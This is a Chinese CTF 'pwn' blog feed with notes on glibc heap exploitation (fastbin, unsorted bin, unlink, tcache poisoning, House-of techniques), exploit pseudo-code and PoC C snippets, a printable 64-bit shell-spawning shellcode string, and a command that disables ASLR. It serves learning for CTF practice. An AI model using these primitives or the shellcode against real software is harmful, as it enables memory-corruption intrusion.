href="#堆漏洞的利用思想" class="headerlink" title="堆漏洞的利用思想"></a>堆漏洞的利用思想</h2><p>破坏堆内存管理的相关数据结构：如arena、bin、chunk<br>破坏堆内存中的用户数据：覆盖变量指针、函数指针、数据等<br>一般情况下都是为了构造任意内存读写以及控制流劫持</p><h2 id="堆漏洞的防护方法"><a href="#堆漏洞的防护方法" class="headerlink" title="堆漏洞的防护方法"></a>堆漏洞的防护方法</h2><p>保护堆内存管理相关的数据结构：Heap Canary、对数据结构进行加密、在堆管理代码中加入大量安全检查<br>通用防护：ASLR、DEP</p><h2 id="堆漏洞利用技术与技巧"><a href="#堆漏洞利用技术与技巧" class="headerlink" title="堆漏洞利用技术与技巧"></a>堆漏洞利用技术与技巧</h2><h3 id="Use-After-Free-amp-Double-Free"><a href="#Use-After-Free-amp-Double-Free" class="headerlink" title="Use After Free &amp; Double Free"></a>Use After Free &amp; Double Free</h3><p>UAF:<strong>DEFCON CTF Qualifier 2014:shitsco、BCTF 2016:router、HCTF 2016 5-days(较难)</strong></p><p>Double Free: <strong>0CTF 2016:freenote、HCTF 2016 fheap、HCTF 2016 5-days(较难)</strong></p><h3 id="Heap-Overwrite"><a href="#Heap-Overwrite" class="headerlink" title="Heap Overwrite"></a>Heap Overwrite</h3><h4 id="Overflow-directly"><a href="#Overflow-directly" class="headerlink" title="Overflow directly"></a>Overflow directly</h4><p><strong>XMAN 2016 fengshui(紫荆花 pwn)，SSC安全大会百度展厅 heapcanary，攻防世界 babyfengshui</strong></p><h4 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h4><p>利用套路:Heap fengshui，house of Spirit</p><p><strong>alictf 2016 fb，alictf 2016 starcraft，0ctf 2016 zerostorage(较难)</strong></p><p><strong>alictf 2016 starcraft，0ctf 2016 zerostorage(较难)</strong></p><p><strong>0ctf 2016 zerostorage(较难)</strong></p><h4 id="Unsorted-bin-attack"><a href="#Unsorted-bin-attack" class="headerlink" title="Unsorted bin attack"></a>Unsorted bin attack</h4><p>利用思路</p><p>​    victm-&gt;bk为要写入地址-4，再次分配时bck-&gt;fd=unsorted_chunks(av)会触发一个任意地址写。写入内容是libc中的一个地址。只不过此时unsortbin被破坏，再次分配代码会崩掉，通常可以改写global_max_fast，从而导致接下来所有分配都是在fastbin进行</p><p>​    通过堆溢出覆盖victim-&gt;bk为一个size为fake chunk，再次分配unsorted_chunks(av)-&gt;bk=bck会改写unsortbin链表头的bk，此时再分配x-4大小的内存即可返回fakechunk。</p><p><strong>0ctf2016 Zerostorage</strong></p><h4 id="Overwrite-Topchunk"><a href="#Overwrite-Topchunk" class="headerlink" title="Overwrite Topchunk"></a>Overwrite Topchunk</h4><p>House of Force:</p><p>​    Bin中没有任何合适的内存时会从Topchunk分配内存</p><p>​    改写Topchunk的size为一个很大的数，如0xffffffff，分配alloc_size-4大小的内存，由于alloc_size可控，所以此时topchunk位置可控，再次分配即可分配到想分配的位置</p><p>​    需要预先泄漏topchunk地址</p><p><strong>BCTF 2016 bcloud，BCT 2016 ruin(arm结构的程序)</strong></p><h4 id="Classical-amp-Modern-Unlink-Attack"><a href="#Classical-amp-Modern-Unlink-Attack" class="headerlink" title="Classical&amp;Modern Unlink Attack"></a>Classical&amp;Modern Unlink Attack</h4><p>Unlink:当free(mem)调用时，如果与mem相邻的块是空闲的，则会将其从空闲链表中拿(unlink)下来并与mem合并</p><p>classical Unlink Attack(现glibc中有检查，不可用)：</p><p>​    如果通过heapoverflow将P-&gt;bk以及P-&gt;fd覆盖位攻击者可控制的地址，那FD-&gt;bk=BK;BK-fd=FD;=&gt;P-&gt;fd-&gt;bk=P-&gt;bk;P-&gt;bk-&gt;fd=p-&gt;fd;造成任意写，不过要求(要写的内容+4)or(要写的内容+8)必须可写，否则会崩溃。</p><p>Modern Unlink Attack:</p><p>​    找一个Pointer X，*X=P，Overflow P-bk=X-4;P-fd=X-8</p><p>​    P-&gt;bk-&gt;fd==X-4-&gt;fd==P，P-&gt;fd-&gt;bk==X-8-&gt;bk=P</p><p>​    Unlink可得到*p=X，此时可通过P修改X，如果X是数据指针则可能造成任意地址读写</p><p><strong>Hitcon 2014 qualifier stkof，MMA CTF 2016 Dairy，PlaidCTF 2014 200 ezhp</strong></p><h4 id="Off-by-one-amp-Off-by-null"><a href="#Off-by-one-amp-Off-by-null" class="headerlink" title="Off by one &amp; Off by null"></a>Off by one &amp; Off by null</h4><p>Glibc_Adventures-The_Forgotten_Chunks.pdf</p><p><strong>off by one:MMA CTF 2016 Dairy</strong></p><p><strong>off by null:plaid CTF 2015 datastore，XMAN 2016 Final love_letter</strong></p><h4 id="Other-techniques"><a href="#Other-techniques" class="headerlink" title="Other techniques"></a>Other techniques</h4><p>改写morecore:<strong>HCTF 2016 5-days</strong></p><p>House of Orange : 改写_IO_list_all : <strong>Hitcon 2016House of orange</strong></p><h3 id="General-exploit-techniques"><a href="#General-exploit-techniques" class="headerlink" title="General exploit techniques"></a>General exploit techniques</h3><h4 id="Heap-fengshui-堆风水-堆排布"><a href="#Heap-fengshui-堆风水-堆排布" class="headerlink" title="Heap fengshui(堆风水/堆排布)"></a>Heap fengshui(堆风水/堆排布)</h4><p>通过操纵内存的分配与释放，来控制堆快装内存中的相对位置</p><p>动机：真实漏洞在利用的时候，堆是混乱的，因为存在漏洞的服务可能已经服务过很多用户，在触发漏洞时无法预计堆已经做了多少次malloc多少次free</p><p>Heap fengshui可以让堆从混乱状态转换为确定状态</p><p>不同的内存管理策略对应的heap fengshui的方法不同</p><p><strong>XMAN 2016 fengshui，33c3 CTF babyfengshui</strong></p><h4 id="Heap-spray-对喷"><a href="#Heap-spray-对喷" class="headerlink" title="Heap spray(对喷)"></a>Heap spray(对喷)</h4><p>不断分配分配内存，并填充(大量0x0c)+shellcode，直到0x0c0c0c0c内存地址被分配，多用于脚本语言漏洞的利用</p><p>大多数内存地址的值都是0x0c0c0c0c，0x0c0c0c0c地址也是0x0c slide+shellcode可以用其绕过ASLR，控制流劫持(jmpaddr/jmp <em>addr)时，只要addr是喷过地址都可以执行shellcode，注意</em><code>addr=0x0c0c0c0c **addr=0x0c0c0c0c  ***addr=0x0c0c0c0c</code></p><p>必须在NX关闭时才能直接用heap spray劫持控制流</p><p><strong>pwnhub.cn calc</strong></p><h4 id="Exploit-mmap-chunk"><a href="#Exploit-mmap-chunk" class="headerlink" title="Exploit mmap chunk"></a>Exploit mmap chunk</h4><p>当malloc内存块大于128k时，glibc会直接mmap内存</p><p>如果mmap的内存将整个binary的地址空间全部覆盖，我们可以轻松拿到任意地址相邻的堆内存，ASLR就失去意义</p><p>适用于没有限制分配内存大小的题目</p><p><strong>Hitcon 2014 qualifier stkof</strong></p><p>0ops培训资料Linux heap internal.pdf</p><h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><p><strong>MMACTF 2016 greeting，HCTF 2016 fheap，RuCTF 2016 weather</strong></p><h1 id="竞争条件漏洞"><a href="#竞争条件漏洞" class="headerlink" title="竞争条件漏洞"></a>竞争条件漏洞</h1><p><strong>安恒杯 武汉大学邀请赛 fackfuzz，stupid shell</strong></p><p><strong>stupid shell</strong></p><h1 id="代码逻辑漏洞"><a href="#代码逻辑漏洞" class="headerlink" title="代码逻辑漏洞"></a>代码逻辑漏洞</h1><p><strong>UCTF 2016 note</strong></p><h1 id="类型混淆漏洞"><a href="#类型混淆漏洞" class="headerlink" title="类型混淆漏洞"></a>类型混淆漏洞</h1><p><strong>CVE-2015-3077</strong></p><h1 id="缓冲区未初始化"><a href="#缓冲区未初始化" class="headerlink" title="缓冲区未初始化"></a>缓冲区未初始化</h1><p>栈未初始化时，栈中数据为上次函数调用留下的栈帧</p><p>堆未初始化时，堆中数据为上次使用该堆块所留下的数据</p><p><strong>UCTF 2016 note，华山杯2016决赛 SU_PWN，33C3 CTF PWN</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;关闭aslr&quot;&gt;&lt;a href=&quot;#关闭aslr&quot; class=&quot;headerlink&quot; title=&quot;关闭aslr&quot;&gt;&lt;/a&gt;关闭aslr&lt;/h1&gt;&lt;p&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/p&gt;
&lt;h1 id=
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>shellcode</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/shellcode/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/shellcode/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:25:06.515Z</updated>
    
    <content type="html"><![CDATA[<h1 id="64位可打印shell"><a href="#64位可打印shell" class="headerlink" title="64位可打印shell"></a>64位可打印shell</h1><p>PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</p><h1 id="pwntools模块"><a href="#pwntools模块" class="headerlink" title="pwntools模块"></a>pwntools模块</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span> <span class="comment">#64位</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><h1 id="shellcode-encoder"><a href="#shellcode-encoder" class="headerlink" title="shellcode_encoder"></a>shellcode_encoder</h1><p>下载地址：<a href="https://github.com/ecx86/shellcode_encoder" target="_blank" rel="noopener">https://github.com/ecx86/shellcode_encoder</a></p><p>自动生成可打印shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./main.py shellcode rax+29</span><br></pre></td></tr></table></figure><p>其中shellcode为原shellcode的二进制文件，rax+29表示通过call rax执行shellcode。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;64位可打印shell&quot;&gt;&lt;a href=&quot;#64位可打印shell&quot; class=&quot;headerlink&quot; title=&quot;64位可打印shell&quot;&gt;&lt;/a&gt;64位可打印shell&lt;/h1&gt;&lt;p&gt;PPYh00AAX1A0hA004X1A4hA00AX1A8QX44
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn中各种利用技巧2</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A72/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A72/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:24:54.198Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><p>把ret指针修改为jmp esp的地址，其后加上asm(sub esp,20,;jmp esp)，来跳转到shellcode处（ps：20表示偏移量20，需修改）</p><h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><p>利用leave劫持ebp，从而使得ret到ebp+8</p><h1 id="基于堆类型"><a href="#基于堆类型" class="headerlink" title="基于堆类型"></a>基于堆类型</h1><h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p>FIFO：先进先出</p><p>free后，fd和bk为main_arena加上一定偏移的地址，可用于泄漏libc地址。</p><h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><p>FILO：先进后出</p><p>连续两次free相同大小后，最后一个free的fd指向前一个free的地址，可通过修改该值后用于申请任意地址。</p><h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p>FILO：先进后出</p><p>free时每类大小的bin中可存放7个tcache，其fd指向下一个tcache。</p><p>malloc时如果从fastbin中申请一个块，则剩下的块存入tcache中至满。</p><p>连续两次free相同大小后，最后一个free的fd指向前一个free的地址，可通过修改该值后用于申请任意地址。</p><h2 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h2><p>为双向链表，构造时需要同时修改fd与bk</p><h1 id="基于堆的攻击方法"><a href="#基于堆的攻击方法" class="headerlink" title="基于堆的攻击方法"></a>基于堆的攻击方法</h1><h2 id="Overflow-directly"><a href="#Overflow-directly" class="headerlink" title="Overflow directly"></a>Overflow directly</h2><p>直接溢出，最容易利用，需要构造好块</p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>free后未把指针置NULL，可重复使用该指针</p><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p>通常与UAF一起出现</p><p>常见套路:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这时申请到的块依次为1-&gt;2-&gt;1，fastbin可通过此任意申请地址</p><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>原理：修改fd指针伪造fastbin链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(ptr))<span class="comment">#UAF</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p>此时3的地址为ptr+0x10，注意，ptr+8处的值应对应申请的fastbin大小。</p><h2 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h2><p>2.23版本位于0x3c67f8处</p><p>修改后可将fastbin范围扩大，更容易使用fastbin相关攻击。</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin dup consolidate"></a>fastbin dup consolidate</h2><p>通过申请largebin触发malloc_consolidate，即可将原本free的fastbin放入unsortbin中，然后再次free。</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>此时fastbin和unsortbin中都有0对应的地址。</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>与fastbin类似，但需要bk。（双向链表）</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>free后控制bk指针填入一个地址，再申请同样大小的块，即可向(指定地址+2*size)处填入类似[main_arena+88]的地址。</p><p>利用套路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr &#x3D; 0x602180</span><br><span class="line">new(0,0x400)</span><br><span class="line">new(9,10)</span><br><span class="line">free(0)</span><br><span class="line">edit(0,0x10,p64(0)+p64(ptr-0*10))</span><br><span class="line">new(1,0x400)</span><br></pre></td></tr></table></figure><p>此时0处地址为[main_arena+88]的地址。</p><p>注：堆的申请应该在unsortbin之前完成，否则会报错</p><h2 id="unsorted-bin-into-stac"><a href="#unsorted-bin-into-stac" class="headerlink" title="unsorted bin into stac"></a>unsorted bin into stac</h2><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line">  stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">  stack_buffer[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>)stack_buffer;</span><br><span class="line">  victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时victim1的地址与stack_buffer相同</p><h2 id="overlap"><a href="#overlap" class="headerlink" title="overlap"></a>overlap</h2><p>利用条件：off by one或off by null</p><h3 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk extend"></a>chunk extend</h3><p>通过把p位置置0来伪造前面块为freed状态，并且prev_size为前面的伪造free的大小，从而重复申请得到两个指向同一地址的指针</p><p>常见利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">malloc(<span class="number">4</span>,<span class="number">0xf8</span>)<span class="comment">#1</span></span><br></pre></td></tr></table></figure><p>此时4的地址与1相同</p><h3 id="chunk-shrink"><a href="#chunk-shrink" class="headerlink" title="chunk shrink"></a>chunk shrink</h3><p>原理：申请时分割用了size位，free时向前合并时只检查了prev_size</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x218</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x218</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x218</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x200</span>,<span class="string">'\x00'</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x20</span>))</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x218</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x219</span>,<span class="string">'\x00'</span>*<span class="number">0x218</span>+<span class="string">'\x00'</span>)<span class="comment">#将2的size位设为0x200，避免覆盖到3的prev_size位</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="number">0x80</span>)<span class="comment">#获取一个指针留用</span></span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#将2放入unsortbin中</span></span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>free(3)后2变为top chunk，通过构造后可以再申请回4处的地址</p><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><h3 id="new（small-bin-unlink）"><a href="#new（small-bin-unlink）" class="headerlink" title="new（small bin unlink）"></a>new（small bin unlink）</h3><p>在free中若p位为0，则会进行合并，并且将P-&gt;bk-&gt;fd赋值为P-&gt;fd。</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x602180</span>+<span class="number">0x8</span><span class="comment">#ptr为指向伪造的堆块的地址</span></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x30</span>)</span><br><span class="line">fd = ptr - <span class="number">0x18</span></span><br><span class="line">bk = ptr - <span class="number">0x10</span></span><br><span class="line">pay = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">pay += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,len(pay),pay)<span class="comment">#伪造堆</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时ptr处的地址会被更改为ptr-0x18相应地址的值(即伪造堆的fd)</p><h3 id="old"><a href="#old" class="headerlink" title="old"></a>old</h3><p>旧版的libc（picoctf2019有出现，但就是不知道怎么编译的），一般是32位的程序</p><p>将当前堆的prev_size和size位置为0xfffffffc，则会认为上一块的位置为p-(-0x4)。（size位可随意填写）</p><p>设fd覆盖为p，bk覆盖为q。</p><p>则free相邻的前一个块后，*(q+8)=p， *(p+0xc)=q。</p><p>（好像还有其他的利用方法。。。不是很懂，没有具体的程序可以分析，不过picoctf那道倒是这么做的）</p><h2 id="Tcache-1"><a href="#Tcache-1" class="headerlink" title="Tcache"></a>Tcache</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>覆盖 tcache entry 结构体中的 next 域，不经过任何伪造（不需要检查size位） chunk 即可分配到另外地址,类似于fastbin attack。</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="number">0x602180</span></span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x400</span>)</span><br><span class="line">new(<span class="number">9</span>,<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(ptr))</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x400</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="number">0x400</span>)</span><br></pre></td></tr></table></figure><p>此时4的地址为ptr。</p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>类似于 fastbin 的double free，就是多次释放同一个tcache，形成环状链表</p><h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>控制<code>tcache_perthread_struct</code>结构体</p><p>修改其中相应大小bins的数量及地址，即可任意申请</p><h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>free 内存后，使得栈上的一块地址进入 tcache 链表，这样再次分配的时候就能把这块地址分配出来</p><h3 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h3><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p><h2 id="house-of-系列"><a href="#house-of-系列" class="headerlink" title="house of 系列"></a>house of 系列</h2><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><ol><li>伪造堆块</li><li>覆盖堆指针指向上面伪造堆</li><li>释放堆块</li><li>申请堆块</li></ol><p>例题：l-ctf2016–pwn200</p><h3 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h3><h4 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h4><ol><li>申请a、b块</li><li>并且伪造堆块（prev_size、size位任意，fd、bk都设置为堆块本身）</li><li>将b的prev_inuse置0，并把b的prev_size位设置为b-&gt;fd的地址减去伪造堆的地址</li><li>伪造堆的size位同样设置为b-&gt;fd的地址减去伪造堆的地址</li><li>释放掉堆块b，此时再申请即从伪造堆处开始</li></ol><h4 id="2-27"><a href="#2-27" class="headerlink" title="2.27"></a>2.27</h4><ol><li>申请a、b块</li><li>并且伪造堆块（prev_size、size位任意，fd、bk都设置为堆块本身）</li><li>将b的prev_inuse置0，并把b的prev_size位设置为b-&gt;fd的地址减去伪造堆的地址</li><li>伪造堆的size位同样设置为b-&gt;fd的地址减去伪造堆的地址，并且将相邻的下一堆块的prev_size设置为同样的b-&gt;fd的地址减去伪造堆的地址</li><li>释放掉堆块b，此时再申请即从伪造堆处开始</li></ol><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><p>利用条件：</p><ol><li>能够控制top chunk的size位</li><li>能自用控制malloc的分配大小</li><li>分配的次数不能受限制</li></ol><p>利用方法：</p><ol><li>申请堆块a</li><li>将topchunk的size改为-1</li><li>申请(addr-0x28)-topchunk_addr的块</li><li>再申请块，即可获得指向addr的块</li></ol><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><ol><li>申请堆块a,b</li><li>伪造堆块f1，f2：其中f1的prev_size和size位为0，fd指向堆块a，bk指向堆块f2；f2的fd指向f1</li><li>释放堆块a</li><li>申请堆块c</li><li>设置堆块a的bk为f1的地址</li><li>申请堆块d、e，则堆块e指向f1</li></ol><h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h4 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h4><p>通过修改chunk1的size位实现overlap。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">chunk2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="built_in">free</span>(chunk2);</span><br><span class="line">chunk[<span class="number">-1</span>]=<span class="number">0xa1</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span 